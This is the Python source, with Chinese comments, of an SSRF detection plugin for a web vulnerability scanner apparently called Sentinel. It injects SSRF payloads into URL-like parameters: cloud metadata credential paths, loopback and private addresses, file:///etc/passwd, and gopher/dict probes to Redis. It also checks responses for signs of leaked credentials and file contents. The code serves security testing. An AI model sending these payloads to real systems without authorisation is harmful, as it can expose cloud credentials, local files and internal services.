"""服务端请求伪造插件 (w13scan 有 ``VulType.SSRF`` 与回连平台, 但无独立主动插件).

w13scan 把 SSRF 的验证交给了 ``reverseApi`` 回连平台; 这里做成独立插件, 采用三级
证据链, 由强到弱:

1. **回连证据** — 载荷指向 Sentinel 的带外回调服务 (``ctx.oob``), 服务端真的发起了
   请求才会在登记表里留下 token。这是唯一能证明"服务端出网"的证据。
2. **内网内容证据** — 响应里出现云元数据 / 内网服务特征 (``iam-credentials``、
   ``sentinel-ssrf-ok``、``root:x:0:0:``), 说明请求被服务端代发并回显。
3. **协议处理证据** — ``file://`` ``gopher://`` ``dict://`` 等非 HTTP 协议被接受。

只有 1 或 2 会直接判定; 3 单独命中按"疑似"处理 (置信度 0.6), 因为有些框架会原样
回显 URL 而不真正发起请求。
"""
from __future__ import annotations

import hashlib

from ...core.models import Finding, Severity
from .base import A10, Plugin, PluginContext, register, snippet

#: 内网 / 云元数据地址
INTERNAL_PAYLOADS: tuple[str, ...] = (
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://localhost/",
    "http://127.0.0.1:8080/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://192.168.0.1/",
    "http://10.0.0.1/",
    "http://metadata.google.internal/computeMetadata/v1/",
)

#: 非 HTTP 协议 (命中按"疑似"处理)
SCHEME_PAYLOADS: tuple[str, ...] = (
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/INFO",
)

#: 响应中的内网内容特征 -> 说明
INTERNAL_SIGNS: tuple[tuple[str, str], ...] = (
    ("sentinel-ssrf-ok", "Sentinel 带外服务被服务端访问"),
    ("internal-service-reached", "服务端访问到了内网服务"),
    ("iam-credentials", "读取到云主机元数据凭据"),
    ("accessKeyId", "读取到云主机元数据凭据"),
    ("root:x:0:0:", "通过 file:// 读取到本地文件"),
    ("[fonts]", "通过 file:// 读取到本地文件"),
    ("redis_version", "通过 gopher/dict 协议访问到内网 Redis"),
)


@register
class Ssrf(Plugin):
    """服务端请求伪造 (w13scan ``VulType.SSRF`` 的主动化实现)."""

    name = "ssrf"
    title = "服务端请求伪造 (SSRF)"
    category = "ssrf"
    severity = Severity.HIGH
    cwe = "CWE-918"
    owasp = A10
    description = "注入内网/回连地址与非 HTTP 协议, 依据回调登记与内网内容判定"
    param_hints = ("url", "uri", "link", "image", "img", "src", "target", "callback",
                   "webhook", "proxy", "fetch", "domain", "host", "site", "page",
                   "path", "file", "dest", "redirect", "return", "next", "feed",
                   "remote", "addr", "address", "ip", "endpoint", "api")
    references = ("https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",)

    def run(self, ctx: PluginContext) -> list[Finding]:
        # token 用稳定摘要 (不用 hash(): 它随 PYTHONHASHSEED 变化, 不利于复现)
        digest = hashlib.md5(ctx.endpoint.url.encode()).hexdigest()[:10]
        token = f"sentinel-{digest}"
        payloads = [f"http://{ctx.oob_host}:{ctx.oob_port}/{token}"]
        payloads += list(INTERNAL_PAYLOADS)

        for payload in payloads:
            result = ctx.inject(payload)
            if not result.status or not result.body:
                continue
            body = result.text
            hit = _internal_hit(body)
            if hit or (ctx.oob is not None and ctx.oob.seen(token)):
                return [ctx.add(
                    vuln_type="ssrf", url=result.url, method=result.method,
                    param=ctx.param, payload=payload,
                    evidence=snippet(body, hit or "sentinel") or body[:160],
                    severity=self.severity, confidence=0.95,
                    proof=f"服务端按用户可控地址发起请求并返回内网数据 "
                          f"({hit or '带外回调命中'})")]

        for payload in SCHEME_PAYLOADS:
            result = ctx.inject(payload)
            if not result.status or not result.body:
                continue
            hit = _internal_hit(result.text)
            if not hit:
                continue
            return [ctx.add(
                vuln_type="ssrf", url=result.url, method=result.method,
                param=ctx.param, payload=payload,
                evidence=snippet(result.text, hit, 60),
                severity=Severity.MEDIUM, confidence=0.6,
                proof=f"服务端接受了 {payload.split(':', 1)[0]}:// 协议并回显内容 "
                      f"({hit}); 启发式判定, 建议人工确认是否真正代发请求")]
        return []


def _internal_hit(body: str) -> str:
    for sign, _desc in INTERNAL_SIGNS:
        if sign in body:
            return sign
    return ""


__all__ = ["INTERNAL_PAYLOADS", "INTERNAL_SIGNS", "SCHEME_PAYLOADS", "Ssrf"]
